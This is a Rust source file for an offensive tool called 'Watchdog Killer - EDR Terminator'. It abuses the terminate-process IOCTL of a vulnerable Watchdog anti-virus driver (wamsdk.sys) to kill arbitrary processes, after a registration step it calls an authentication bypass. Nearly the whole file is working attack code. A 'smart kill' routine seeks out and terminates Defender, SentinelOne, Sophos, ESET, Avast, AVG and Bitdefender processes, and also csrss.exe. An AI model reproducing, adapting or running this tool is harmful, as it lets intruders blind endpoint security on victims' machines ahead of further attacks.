use std::io::{self, Write};
use std::mem::size_of;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use windows::{
    Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE, GetLastError},
    Win32::Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING},
    Win32::System::IO::DeviceIoControl,
    Win32::System::Threading::GetCurrentProcessId,
    core::PCWSTR,
};
use sysinfo::System;
use colored::*;
use std::sync::atomic::{AtomicU32, Ordering};

// Global statistics counter
static TERMINATED_COUNT: AtomicU32 = AtomicU32::new(0);

// Watchdog Anti-Virus Driver Information
// Driver: wamsdk.sys
// SHA256: 5AF1DAE21425DDA8311A2044209C308525135E1733EEFF5DD20649946C6E054C
const IOCTL_REGISTER_PROCESS: u32 = 0x80002010;
const IOCTL_TERMINATE_PROCESS: u32 = 0x80002048;

const ZAM_DEVICE_NAME: &str = r"\\.\\amsdk";
const ZAM_GUARD_DEVICE_NAME: &str = r"\\.\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F";

/// Structure for process termination request via vulnerable Watchdog driver
/// Exploits IOCTL 0x80002048 in wamsdk.sys
/// SHA256: 5AF1DAE21425DDA8311A2044209C308525135E1733EEFF5DD20649946C6E054C
#[repr(C)]
struct TerminateProcessRequest {
    process_id: u32,
    wait_for_exit: u32,
}

fn to_wide_chars(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn open_zam_device() -> HANDLE {
    let primary = to_wide_chars(ZAM_DEVICE_NAME);
    let handle = unsafe {
        CreateFileW(
            PCWSTR::from_raw(primary.as_ptr()),
            0x80000000u32 | 0x40000000u32,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
    };

    match handle {
        Ok(h) if h != INVALID_HANDLE_VALUE => h,
        _ => {
            let fallback = to_wide_chars(ZAM_GUARD_DEVICE_NAME);
            unsafe {
                CreateFileW(
                    PCWSTR::from_raw(fallback.as_ptr()),
                    0x80000000u32 | 0x40000000u32,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    None,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    None,
                ).unwrap_or(INVALID_HANDLE_VALUE)
            }
        }
    }
}

fn register_process(h_device: HANDLE) -> bool {
    let pid = unsafe { GetCurrentProcessId() };
    let mut bytes_returned: u32 = 0;

    println!("[*] Attempting to register process {}...", pid);

    let result = unsafe {
        DeviceIoControl(
            h_device,
            IOCTL_REGISTER_PROCESS,
            Some(&pid as *const _ as *const std::ffi::c_void),
            size_of::<u32>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    match result {
        Ok(_) => {
            println!("{} {}", "[+] Successfully registered process".green(), pid);
            true
        }
        Err(_) => {
            let error = unsafe { GetLastError() };
            println!("{} {:?}", "[-] Failed to register process. Error:".red(), error);
            false
        }
    }
}

fn terminate_process_by_pid(h_device: HANDLE, pid: u32, wait: bool) -> bool {
    let mut bytes_returned: u32 = 0;
    let request = TerminateProcessRequest {
        process_id: pid,
        wait_for_exit: if wait { 1 } else { 0 },
    };

    let result = unsafe {
        DeviceIoControl(
            h_device,
            IOCTL_TERMINATE_PROCESS,
            Some(&request as *const _ as *const std::ffi::c_void),
            size_of::<TerminateProcessRequest>() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
    };

    match result {
        Ok(_) => {
            println!("{} {}", "[+] Terminate request for PID sent successfully:".green(), pid);
            true
        }
        Err(_) => {
            let error = unsafe { GetLastError() };
            println!("{} {:?}", "[-] Failed to terminate PID. Error:".red(), error);
            false
        }
    }
}

fn get_user_input(prompt: &str) -> Result<String, std::io::Error> {
    print!("{}", prompt.bold());
    io::stdout().flush()?;
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

fn list_processes() {
    let mut system = System::new_all();
    system.refresh_all();
    
    println!("\n{}", "Running Processes:".yellow().bold());
    println!("{:<8} {:<30} {:<10} {:<15}", "PID", "Name", "Memory (MB)", "Status");
    println!("{}", "─".repeat(70));
    
    let mut count = 0;
    for (pid, process) in system.processes() {
        if count >= 50 { // Limit to first 50 processes
            println!("{}", "... (showing first 50 processes)".dimmed());
            break;
        }
        println!("{:<8} {:<30} {:<10.1} {:<15}", 
                pid, 
                process.name(), 
                process.memory() as f64 / 1024.0 / 1024.0,
                process.status().to_string());
        count += 1;
    }
    println!("\n{} {}", "Total processes:".green(), system.processes().len());
}

fn kill_by_name(h_device: HANDLE) {
    match get_user_input("Enter process name (partial match): ") {
        Ok(name_filter) => {
            if name_filter.is_empty() {
                println!("{}", "Invalid process name.".red());
                return;
            }
            
            let mut system = System::new_all();
            system.refresh_all();
            
            let mut found_processes = Vec::new();
            for (pid, process) in system.processes() {
                if process.name().to_lowercase().contains(&name_filter.to_lowercase()) {
                    found_processes.push((*pid, process.name().to_string()));
                }
            }
            
            if found_processes.is_empty() {
                println!("{} '{}'", "No processes found matching:".yellow(), name_filter);
                return;
            }
            
            println!("\n{}", "Found matching processes:".cyan());
            for (pid, name) in &found_processes {
                println!("{} {} ({})", "[*]".green(), name, pid);
            }
            
            match get_user_input("\nTerminate all matching processes? (y/N): ") {
                Ok(confirm) if confirm.to_lowercase() == "y" || confirm.to_lowercase() == "yes" => {
                    for (pid, name) in found_processes {
                        println!("{} {} ({})", "[*] Terminating:".yellow(), name, pid);
                        if terminate_process_by_pid(h_device, pid.as_u32(), false) {
                            TERMINATED_COUNT.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                _ => println!("{}", "Operation cancelled.".yellow())
            }
        }
        Err(_) => println!("{}", "Error reading input.".red())
    }
}

fn batch_kill(h_device: HANDLE) {
    println!("{}", "Enter PIDs separated by spaces or commas:".cyan());
    match get_user_input("PIDs: ") {
        Ok(input) => {
            let pids: Vec<u32> = input
                .replace(',', " ")
                .split_whitespace()
                .filter_map(|s| s.parse().ok())
                .collect();
            
            if pids.is_empty() {
                println!("{}", "No valid PIDs provided.".red());
                return;
            }
            
            println!("\n{} {:?}", "PIDs to terminate:".yellow(), pids);
            match get_user_input("Confirm batch termination? (y/N): ") {
                Ok(confirm) if confirm.to_lowercase() == "y" || confirm.to_lowercase() == "yes" => {
                    for pid in pids {
                        println!("{} {}", "[*] Terminating PID:".yellow(), pid);
                        if terminate_process_by_pid(h_device, pid, false) {
                            TERMINATED_COUNT.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                _ => println!("{}", "Batch operation cancelled.".yellow())
            }
        }
        Err(_) => println!("{}", "Error reading input.".red())
    }
}


fn display_menu() {
    println!("\n{}", "═══════════════════════════════════════".blue());
    println!("{}", "    WATCHDOG KILLER - MAIN MENU".bold().white());
    println!("{}", "═══════════════════════════════════════".blue());
    println!("  {} Manual PID Kill", "[1]".green().bold());
    println!("  {} Smart-Kill Known EDRs", "[2]".green().bold());
    println!("  {} List Running Processes", "[3]".green().bold());
    println!("  {} Kill Process by Name", "[4]".green().bold());
    println!("  {} Batch Kill Multiple PIDs", "[5]".green().bold());
    println!("  {} Exit", "[0]".red().bold());
    println!("{}", "═══════════════════════════════════════".blue());
}

fn smart_kill(h_device: HANDLE) {
    let mut system = System::new_all();
    system.refresh_all();

    let edr_targets = vec![
        "MsMpEng.exe", "SentinelAgent.exe", "csrss.exe", "Sophos", "ESET", "avast", "avg",
        "bdagent.exe", "bdntwrk.exe", "bdredline.exe", "bdservicehost.exe", "bdusrhost.exe"
    ];
    println!("\n{}", "[*] Scanning for known EDR/AV processes...".yellow());

    for (pid, process) in system.processes() {
        let name = process.name().to_lowercase();
        if edr_targets.iter().any(|target| name.contains(&target.to_lowercase())) {
            println!("{} {} ({})", "[*] Found target:".cyan(), process.name(), pid);
            if terminate_process_by_pid(h_device, pid.as_u32(), true) {
                TERMINATED_COUNT.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
    println!("{}", "[*] Smart-kill finished.".yellow());
}

fn main() {
    println!("{}", "\nWatchdog Killer - EDR Terminator Tool by @3xploit666".bold().white());
    println!("{}\n", "========================================================".blue());

    let h_device = open_zam_device();
    if h_device == INVALID_HANDLE_VALUE {
        let error = unsafe { GetLastError() };
        println!("{} {:?}", "[-] Failed to open ZAM device. Error:".red(), error);
        return;
    }

    println!("{}", "[+] Successfully opened ZAM device.".green());

    if !register_process(h_device) {
        println!("{}", "[!] Authentication bypass failed. Continuing anyway...".yellow());
    }

    loop {
        display_menu();
        
        match get_user_input("Choose option: ") {
            Ok(input) => {
                match input.trim() {
                    "1" => {
                        // Manual PID Kill
                        match get_user_input("Enter PID to terminate: ") {
                            Ok(pid_str) => {
                                let pid = pid_str.parse::<u32>().unwrap_or(0);
                                if pid == 0 {
                                    println!("{}", "Invalid PID.".red());
                                    continue;
                                }
                                
                                match get_user_input("Wait for process exit? (y/N): ") {
                                    Ok(wait_str) => {
                                        let wait = wait_str.to_lowercase() == "y" || wait_str.to_lowercase() == "yes";
                                        if terminate_process_by_pid(h_device, pid, wait) {
                                            TERMINATED_COUNT.fetch_add(1, Ordering::Relaxed);
                                        }
                                    }
                                    Err(_) => println!("{}", "Error reading input.".red())
                                }
                            }
                            Err(_) => println!("{}", "Error reading input.".red())
                        }
                    }
                    "2" => {
                        // Smart-Kill Known EDRs
                        smart_kill(h_device);
                    }
                    "3" => {
                        // List Running Processes
                        list_processes();
                    }
                    "4" => {
                        // Kill Process by Name
                        kill_by_name(h_device);
                    }
                    "5" => {
                        // Batch Kill Multiple PIDs
                        batch_kill(h_device);
                    }
                    "0" => {
                        println!("{}", "Exiting...".blue());
                        unsafe { let _ = CloseHandle(h_device); };
                        break;
                    }
                    _ => println!("{}", "Invalid option. Please choose 0-5.".red()),
                }
            }
            Err(_) => println!("{}", "Error reading input.".red())
        }
    }
}
